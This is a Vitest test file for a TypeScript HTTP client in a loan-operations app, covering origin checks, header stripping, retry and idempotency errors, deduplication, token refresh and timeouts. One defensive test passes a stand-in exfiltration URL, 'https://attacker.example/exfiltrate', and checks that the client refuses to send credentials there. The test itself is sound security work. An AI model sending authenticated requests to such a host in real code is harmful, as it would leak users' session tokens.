import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  ApiError,
  fetchExternal,
  requestBlob,
  requestJson,
  requestJsonWithHeaders,
  setRefreshCallback,
} from "@/lib/api/http-client";
import { readPaginationHeaders } from "@/lib/api/pagination-headers";
import { saveStoredSession, clearStoredSession } from "@/lib/api/session-storage";
import type { Session } from "@/features/auth/session-types";

const TEST_SESSION: Session = {
  user: {
    id: "00000000-0000-4000-8000-000000000001",
    username: "ops.admin",
    role: "SYSTEM_ADMIN",
    roles: ["SYSTEM_ADMIN"],
    lspId: null,
    mustChangePassword: false,
  },
  accessToken: "session-access-token",
  expiresAt: "2099-01-01T00:00:00.000Z",
};

describe("http-client", () => {
  beforeEach(() => {
    clearStoredSession();
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    setRefreshCallback(null);
    clearStoredSession();
  });

  it("refuses credential-bearing cross-origin absolute URLs before fetch", async () => {
    saveStoredSession(TEST_SESSION);
    const fetchMock = vi.fn();
    vi.stubGlobal("fetch", fetchMock);

    await expect(requestJson("https://attacker.example/exfiltrate")).rejects.toThrow(
      /Refusing cross-origin authenticated request/,
    );
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("allows same-origin absolute URLs", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ ok: true }), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }),
      ),
    );

    await expect(
      requestJson(
        "http://localhost:8080/api/v1/internal/home/overview",
        {},
        { authenticated: false },
      ),
    ).resolves.toEqual({ ok: true });
  });

  it("fetchExternal strips caller-supplied credentials and idempotency metadata", async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response("ok", { status: 200 }));
    vi.stubGlobal("fetch", fetchMock);
    saveStoredSession(TEST_SESSION);

    await fetchExternal("https://hooks.example.com/ping", {
      method: "GET",
      credentials: "include",
      headers: {
        Authorization: "Bearer caller-secret",
        "Idempotency-Key": "internal-operation-key",
        "X-Public-Header": "safe",
      },
    });

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [, init] = fetchMock.mock.calls[0] as [string, RequestInit];
    expect(init.credentials).toBe("omit");
    const headers = new Headers(init.headers);
    expect(headers.get("Authorization")).toBeNull();
    expect(headers.get("Idempotency-Key")).toBeNull();
    expect(headers.get("X-Public-Header")).toBe("safe");
  });

  it("surfaces Retry-After on 429 responses", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(
          JSON.stringify({
            code: "RATE_LIMIT_EXCEEDED",
            message: "Too many requests. Please retry after 30 seconds.",
          }),
          {
            status: 429,
            headers: {
              "Content-Type": "application/json",
              "Retry-After": "30",
            },
          },
        ),
      ),
    );

    await expect(requestJson("/api/v1/internal/reports/portfolio-mis/summary")).rejects.toSatisfy(
      (error: unknown) => {
        expect(error).toBeInstanceOf(ApiError);
        const apiError = error as ApiError;
        expect(apiError.status).toBe(429);
        expect(apiError.code).toBe("RATE_LIMIT_EXCEEDED");
        expect(apiError.retryAfterSeconds).toBe(30);
        return true;
      },
    );
  });

  it("surfaces Retry-After on retryable 409 IDEMPOTENCY_IN_PROGRESS conflicts", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(
          JSON.stringify({
            code: "IDEMPOTENCY_IN_PROGRESS",
            message: "An identical request is still being processed. Retry shortly.",
          }),
          {
            status: 409,
            headers: {
              "Content-Type": "application/json",
              "Retry-After": "5",
            },
          },
        ),
      ),
    );

    await expect(
      requestJson("/api/v1/internal/ops/loan-applications/abc/status-transitions", {
        method: "POST",
        body: "{}",
      }),
    ).rejects.toSatisfy((error: unknown) => {
      expect(error).toBeInstanceOf(ApiError);
      const apiError = error as ApiError;
      expect(apiError.status).toBe(409);
      expect(apiError.code).toBe("IDEMPOTENCY_IN_PROGRESS");
      expect(apiError.retryAfterSeconds).toBe(5);
      expect(apiError.settled).toBe(true);
      return true;
    });
  });

  it("does not surface Retry-After on terminal 409 idempotency conflicts", async () => {
    for (const code of ["IDEMPOTENCY_CONFLICT", "IDEMPOTENCY_RECOVERY_REQUIRED"]) {
      vi.stubGlobal(
        "fetch",
        vi.fn().mockResolvedValue(
          new Response(JSON.stringify({ code, message: "conflict" }), {
            status: 409,
            headers: {
              "Content-Type": "application/json",
              // Even if a terminal conflict ever carried the header, clients must
              // not treat it as retryable.
              "Retry-After": "3",
            },
          }),
        ),
      );

      await expect(
        requestJson("/api/v1/internal/ops/loan-applications/abc/status-transitions", {
          method: "POST",
          body: "{}",
        }),
      ).rejects.toSatisfy((error: unknown) => {
        expect(error).toBeInstanceOf(ApiError);
        const apiError = error as ApiError;
        expect(apiError.status).toBe(409);
        expect(apiError.code).toBe(code);
        expect(apiError.retryAfterSeconds).toBeNull();
        return true;
      });
      vi.unstubAllGlobals();
    }
  });

  it("parses typed 404 NOT_FOUND envelope", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(
          JSON.stringify({
            code: "NOT_FOUND",
            message: "Unknown loan application id: 00000000-0000-0000-0000-000000000099",
            status: 404,
          }),
          { status: 404, headers: { "Content-Type": "application/json" } },
        ),
      ),
    );

    await expect(requestJson("/api/v1/internal/ops/loan-applications/missing")).rejects.toSatisfy(
      (error: unknown) => {
        expect(error).toBeInstanceOf(ApiError);
        const apiError = error as ApiError;
        expect(apiError.status).toBe(404);
        expect(apiError.code).toBe("NOT_FOUND");
        expect(apiError.message).toContain("Unknown loan application");
        return true;
      },
    );
  });

  it("returns JSON body and response headers", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify([{ id: "loan-1" }]), {
          status: 200,
          headers: {
            "Content-Type": "application/json",
            "X-Total-Count": "42",
            "X-Limit": "25",
            "X-Offset": "50",
          },
        }),
      ),
    );

    const { data, headers } = await requestJsonWithHeaders<[{ id: string }]>(
      "/api/v1/lsp/loan-applications?paginationDetails=ON",
    );

    expect(data).toEqual([{ id: "loan-1" }]);
    expect(readPaginationHeaders(headers)).toEqual({
      totalCount: 42,
      limit: 25,
      offset: 50,
    });
  });

  it("does not dedupe requestJson against requestJsonWithHeaders for the same URL", async () => {
    const fetchMock = vi.fn().mockImplementation(() =>
      Promise.resolve(
        new Response(JSON.stringify([{ id: "loan-1" }]), {
          status: 200,
          headers: {
            "Content-Type": "application/json",
            "X-Total-Count": "1",
          },
        }),
      ),
    );
    vi.stubGlobal("fetch", fetchMock);

    const path = "/api/v1/lsp/loan-applications?paginationDetails=ON";
    const [bodyOnly, withHeaders] = await Promise.all([
      requestJson<[{ id: string }]>(path),
      requestJsonWithHeaders<[{ id: string }]>(path),
    ]);

    expect(fetchMock).toHaveBeenCalledTimes(2);
    expect(bodyOnly).toEqual([{ id: "loan-1" }]);
    expect(withHeaders.data).toEqual([{ id: "loan-1" }]);
    expect(withHeaders.headers.get("X-Total-Count")).toBe("1");
  });

  it("still dedupes concurrent requestJson calls for the same URL", async () => {
    const fetchMock = vi.fn().mockResolvedValue(
      new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }),
    );
    vi.stubGlobal("fetch", fetchMock);

    const path = "/api/v1/internal/reports/portfolio-mis/summary";
    const [first, second] = await Promise.all([
      requestJson<{ ok: boolean }>(path),
      requestJson<{ ok: boolean }>(path),
    ]);

    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(first).toEqual({ ok: true });
    expect(second).toEqual({ ok: true });
  });

  it("refreshes and retries blob downloads after 401", async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce(new Response("unauthorized", { status: 401 }))
      .mockResolvedValueOnce(
        new Response("pdf-bytes", {
          status: 200,
          headers: {
            "Content-Disposition": 'attachment; filename="statement.pdf"',
          },
        }),
      );
    vi.stubGlobal("fetch", fetchMock);
    setRefreshCallback(async () => "fresh-token");

    const result = await requestBlob("/api/v1/internal/documents/1/download");

    expect(fetchMock).toHaveBeenCalledTimes(2);
    const retryHeaders = fetchMock.mock.calls[1]?.[1]?.headers as Headers;
    expect(retryHeaders.get("Authorization")).toBe("Bearer fresh-token");
    expect(result.filename).toBe("statement.pdf");
    expect(await result.blob.text()).toBe("pdf-bytes");
  });

  it("does not recursively refresh a request that validates a fresh token", async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response("unauthorized", { status: 401 }));
    const refreshCallback = vi.fn().mockResolvedValue("another-token");
    vi.stubGlobal("fetch", fetchMock);
    setRefreshCallback(refreshCallback);

    await expect(
      requestJson(
        "/api/v1/internal/system/context",
        {},
        { accessToken: "fresh-token", refreshOnUnauthorized: false },
      ),
    ).rejects.toMatchObject({ status: 401 });

    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(refreshCallback).not.toHaveBeenCalled();
  });
});

describe("http-client deadlines + cancellation (M21)", () => {
  beforeEach(() => {
    clearStoredSession();
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.useRealTimers();
    setRefreshCallback(null);
    clearStoredSession();
  });

  /** A fetch that stays pending until the request's signal aborts it. */
  function hangingFetch() {
    return vi.fn((_url: unknown, init?: RequestInit) => {
      return new Promise<Response>((_resolve, reject) => {
        const signal = init?.signal;
        if (!signal) return; // never settles — deadline/caller must abort
        if (signal.aborted) {
          reject(signal.reason ?? new DOMException("Aborted", "AbortError"));
          return;
        }
        signal.addEventListener(
          "abort",
          () => reject(signal.reason ?? new DOMException("Aborted", "AbortError")),
          { once: true },
        );
      });
    });
  }

  it("produces a distinct REQUEST_TIMEOUT error when the deadline fires", async () => {
    vi.useFakeTimers();
    vi.stubGlobal("fetch", hangingFetch());

    const pending = requestJson(
      "/api/v1/internal/reports/portfolio-mis/summary",
      {},
      {
        timeoutMs: 5_000,
      },
    );
    const assertion = expect(pending).rejects.toSatisfy((error: unknown) => {
      expect(error).toBeInstanceOf(ApiError);
      const apiError = error as ApiError;
      expect(apiError.code).toBe("REQUEST_TIMEOUT");
      expect(apiError.status).toBe(0);
      expect(apiError.message).toMatch(/took too long/i);
      // Deadline aborts are transport-uncertain, never settled evidence.
      expect(apiError.settled).toBe(false);
      return true;
    });
    await vi.advanceTimersByTimeAsync(5_000);
    await assertion;
  });

  it("uses the auth budget class for auth requests when no override is given", async () => {
    vi.useFakeTimers();
    vi.stubGlobal("fetch", hangingFetch());

    const pending = requestJson(
      "/api/v1/auth/refresh",
      { method: "POST" },
      { authenticated: false, requestClass: "auth" },
    );
    const assertion = expect(pending).rejects.toMatchObject({ code: "REQUEST_TIMEOUT" });
    // Auth budget is 20s — must NOT fire at the default 30s boundary first.
    await vi.advanceTimersByTimeAsync(20_000);
    await assertion;
  });

  it("mutation timeouts keep the uncertain-status guidance (no assumed rollback)", async () => {
    vi.useFakeTimers();
    vi.stubGlobal("fetch", hangingFetch());

    const pending = requestJson(
      "/api/v1/internal/ops/loan-applications/abc/disbursements",
      { method: "POST", body: "{}" },
      { timeoutMs: 2_000, idempotencyKey: "key-1" },
    );
    const assertion = expect(pending).rejects.toSatisfy((error: unknown) => {
      const apiError = error as ApiError;
      expect(apiError.code).toBe("REQUEST_TIMEOUT");
      expect(apiError.message).toMatch(/may still have processed/i);
      expect(apiError.message).toMatch(/before retrying/i);
      return true;
    });
    await vi.advanceTimersByTimeAsync(2_000);
    await assertion;
  });

  it("forwards the caller's AbortSignal and rejects with it unchanged", async () => {
    const fetchMock = hangingFetch();
    vi.stubGlobal("fetch", fetchMock);
    const caller = new AbortController();

    const pending = requestJson("/api/v1/internal/ops/loan-applications", {
      signal: caller.signal,
    });
    const assertion = expect(pending).rejects.toMatchObject({ name: "AbortError" });
    caller.abort();

    await assertion;
    // The composed fetch signal aborted — never converted into an ApiError.
    const signal = fetchMock.mock.calls[0]?.[1]?.signal;
    expect(signal?.aborted).toBe(true);
  });

  it("a cancelled coalesced caller does not abort the other subscriber's fetch", async () => {
    let capturedSignal: AbortSignal | undefined;
    vi.stubGlobal(
      "fetch",
      vi.fn((_url: unknown, init?: RequestInit) => {
        capturedSignal = init?.signal ?? undefined;
        return new Promise<Response>((resolve, reject) => {
          capturedSignal?.addEventListener(
            "abort",
            () => reject(capturedSignal?.reason ?? new DOMException("Aborted", "AbortError")),
            { once: true },
          );
          // Resolve on the next microtask regardless — the shared fetch lives.
          queueMicrotask(() =>
            resolve(
              new Response(JSON.stringify({ ok: true }), {
                status: 200,
                headers: { "Content-Type": "application/json" },
              }),
            ),
          );
        });
      }),
    );

    const callerA = new AbortController();
    const callerB = new AbortController();
    const path = "/api/v1/internal/reports/portfolio-mis/summary";
    const a = requestJson(path, { signal: callerA.signal });
    const b = requestJson<{ ok: boolean }>(path, { signal: callerB.signal });
    const aAssertion = expect(a).rejects.toMatchObject({ name: "AbortError" });

    // A cancels; B's shared fetch must still resolve, not abort.
    callerA.abort();
    await aAssertion;
    await expect(b).resolves.toEqual({ ok: true });
    // The underlying fetch was never aborted — only one fetch ran.
    expect(capturedSignal?.aborted).toBe(false);
  });

  it("aborts the shared fetch once the LAST coalesced subscriber cancels", async () => {
    let capturedSignal: AbortSignal | undefined;
    vi.stubGlobal(
      "fetch",
      vi.fn((_url: unknown, init?: RequestInit) => {
        capturedSignal = init?.signal ?? undefined;
        return new Promise<Response>((_resolve, reject) => {
          capturedSignal?.addEventListener(
            "abort",
            () => reject(capturedSignal?.reason ?? new DOMException("Aborted", "AbortError")),
            { once: true },
          );
        });
      }),
    );

    const callerA = new AbortController();
    const callerB = new AbortController();
    const path = "/api/v1/internal/reports/portfolio-mis/summary";
    const a = requestJson(path, { signal: callerA.signal });
    const b = requestJson(path, { signal: callerB.signal });
    const assertions = Promise.all([
      expect(a).rejects.toMatchObject({ name: "AbortError" }),
      expect(b).rejects.toMatchObject({ name: "AbortError" }),
    ]);

    callerA.abort();
    // With one subscriber left the shared fetch is still alive.
    await vi.waitFor(() => expect(capturedSignal?.aborted).toBe(false));
    callerB.abort();
    await assertions;
    await vi.waitFor(() => expect(capturedSignal?.aborted).toBe(true));
  });

  it("clears the deadline timer once the request settles", async () => {
    vi.useFakeTimers();
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ ok: true }), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }),
      ),
    );

    await requestJson("/api/v1/internal/home/overview", {}, { authenticated: false });
    // No deadline timer may leak past settlement.
    expect(vi.getTimerCount()).toBe(0);
  });
});
